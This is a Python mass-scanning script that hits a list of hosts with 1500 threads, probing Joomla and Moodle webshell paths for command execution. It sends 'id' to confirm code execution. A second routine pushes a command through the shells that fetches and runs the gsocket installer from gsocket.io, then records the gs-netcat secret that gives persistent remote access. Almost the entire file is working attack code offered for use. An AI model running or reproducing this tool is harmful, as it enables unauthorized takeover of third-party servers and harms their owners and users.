import os, requests, random, sys, re, urllib3
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning, HTTPError, SSLError
from colorama import Fore, Style, init

# Colorama initialization for colored output
init(autoreset=True)

# Disable only InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

# Define color variables for console output
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

# Function to create result directory if it does not exist
def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

Folder('result')

# Open target URLs from the provided file in command line
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit(f'\n  [!] python {path[-1]} list.txt')

# Define the RCE scanner
def rce(i, session):
    try:
        head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
        head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
        paths = [
            "/modules/mod_webshell/mod_webshell.php?action=exec&cmd=id",
        ]

        # Try both http and https protocols
        for proto in ['http://', 'https://']:
            for path in paths:
                try:
                    url = proto + i + path
                    r = session.get(url, headers=head, verify=False, timeout=20)
                    
                    # Searching for the RCE regex pattern
                    match = re.search(r'uid=\d+\([a-zA-Z0-9]+\) gid=\d+\([a-zA-Z0-9]+\) groups=\d+\([a-zA-Z0-9]+\)', r.text)
                    if match:
                        found_pattern = match.group(0)
                        print(f"{fw}[{fg}BX{fw}] {i} << {fg}Found RCE{fw}")
                        with open("result/rce.txt", "a") as file:
                            file.write(f"{url} || {found_pattern}\n")
                        return  # Stop further checking after a match is found
                    else:
                        print(f"{fw}[{fr}BX{fw}] {i} << {fr}Not Found RCE{fw}")
                except requests.RequestException:
                    pass  # Skip the error and continue silently
                except (HTTPError, SSLError) as e:
                    print(f"urllib3 error for {i}: {str(e)}. Attempting to correct.")
                    # Attempt a retry or alternative logic here if needed.
                    # You could attempt another request or fix SSL issues programmatically.
                except Exception:
                    pass  # Catch any other general error and continue
    except Exception:
        pass  # General catch for errors

# Define the gsnetcat scanner
def gsnetcat(i, session):
    try:
        head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
        paths = [
        '''/local/moodle_webshell/webshell.php?action=exec&cmd=bash -c "$(curl -fsSL https://gsocket.io/y)"''',
        '''/blocks/rce/lang/en/block_rce.php?cmd=bash -c "$(curl -fsSL https://gsocket.io/y)"''',
        ]
        
        # Try both http and https protocols
        for proto in ['http://', 'https://']:
            for path in paths:
                try:
                    url = proto + i + path
                    r = session.get(url, headers=head, verify=False, timeout=60)
                    
                    # Searching for the gs-netcat regex pattern
                    match = re.search(r'gs-netcat\s+-s\s+["\']([a-zA-Z0-9]+)["\']\s+-i', r.text)
                    if match:
                        found_pattern = match.group(0)
                        print(f"{fw}[{fg}BX{fw}] {i} << {fg}Found gs-netcat{fw}")
                        with open("result/gsnetcat.txt", "a") as file:
                            file.write(f"{url} || {found_pattern}\n")
                        return  # Stop further checking after a match is found
                    else:
                        print(f"{fw}[{fr}BX{fw}] {i} << {fr}Not Found gs-netcat{fw}")
                except requests.RequestException:
                    pass  # Skip the error and continue silently
                except (HTTPError, SSLError) as e:
                    print(f"urllib3 error for {i}: {str(e)}. Attempting to correct.")
                    # Attempt a retry or alternative logic here if needed.
                    # You could attempt another request or fix SSL issues programmatically.
                except Exception:
                    pass  # Catch any other general error and continue
    except Exception:
        pass  # General catch for errors

# Combine both RCE and gsnetcat scans
def ex2(i, session):
    try:
        gsnetcat(i, session)
        rce(i, session)
    except Exception:
        pass  # General catch for errors

# Main execution block
if __name__ == "__main__":
    # Initialize a global session
    session = requests.Session()
    
    # Display banner or introduction text (if needed)
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """      
    Script Scanning for RCE and gs-netcat Vulnerabilities
    """
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
    
    # Execute the scan in parallel using ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=1500) as executor:
        executor.map(lambda target: ex2(target, session), target)
